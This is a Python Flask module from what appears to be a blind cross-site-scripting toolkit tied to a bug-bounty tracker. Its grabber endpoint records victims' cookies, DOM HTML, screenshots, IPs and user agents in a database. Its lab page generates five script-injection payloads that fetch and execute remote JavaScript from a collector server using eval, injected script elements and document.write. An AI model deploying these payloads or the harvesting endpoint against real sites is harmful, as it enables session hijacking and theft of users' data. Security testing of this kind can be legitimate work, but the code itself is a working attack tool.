from flask import Blueprint, render_template, request
from utils import *
from json import dumps as jsonify

lab = Blueprint('lab', __name__)

"""
id|url|screenshot|ip|domhtml|cookie|useragent
"""
@lab.route('/lab/grabber', methods=['POST'])
def grabber():
	if grab_valid(request.form):
		try:
			db = get_db()
			db.execute("insert into xss (url, screenshot, ip, domhtml, cookie, useragent) values (?, ?, ?, ?, ?, ?)", \
				[request.form['url'], request.form['screenshot'], request.remote_addr, request.form['domhtml'], request.form['cookie'], request.form['useragent']])
			db.commit()
			return 'ok'
		except sqlite3.Error as e:
			return 'db error'
	return 'invalid grabbing'


"""
only diff between lab and index is the include(bounties or lab)
"""
@lab.route('/lab')
def index():
	#gen payload
	payloads = []
	payloads.append('<script>function b(){eval(this.responseText)};a=new XMLHttpRequest();a.addEventListener("load", b);a.open("GET", "//127.0.0.1:5000/js2");a.send();</script>')
	payloads.append('<script>with(top)document.body.appendChild(document.createElement("script")).src="//127.0.0.1:5000/js2";</script>')
	payloads.append("<script>eval('var a=document.createElement(\'script\');a.src=\'//127.0.0.1:5000/js2\';document.body.appendChild(a)')</script>")

	payloads.append('<script>fetch("//127.0.0.1:5000/js").then(function(r){r.text().then(function(w){document.write(w)})})</script>')
	payloads.append('<script>var x=new XMLHttpRequest();x.open("GET","//127.0.0.1:5000/js");x.send(); x.onreadystatechange=function(){if(this.readyState==4){document.write(x.responseText)}}</script>')

	bounties_info, information_count, xsslab_info, xsslab_count, targets_info, targets_count = extract_db()
	return render_template('index.html', bounties=bounties_info, nbounties=information_count[0][0], ndollars=sum_reward(bounties_info), xsslab=xsslab_info, nxss=xsslab_count[0][0], targets=targets_info, ntargets=targets_count[0][0], page="lab.html",payloads=payloads )